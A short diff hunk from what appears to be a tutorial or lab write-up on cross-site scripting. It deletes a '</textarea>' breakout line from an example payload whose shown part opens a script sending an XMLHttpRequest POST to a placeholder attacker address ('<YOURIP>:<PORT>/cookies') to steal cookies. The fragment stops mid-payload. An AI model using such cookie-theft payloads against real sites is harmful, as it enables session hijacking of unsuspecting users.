@@ -97,7 +97,6 @@ Which should in result give us a simple `{ value: 'value' }` logged to our conso
 So as we had before `<script>alert('XSS')</script>` And just replace whats inside the script with what we just tested!
 
 ```html
-</textarea>
 	<script>
 		var xhr = new XMLHttpRequest();
 		xhr.open("POST", 'http://<YOURIP>:<PORT>/cookies', true);
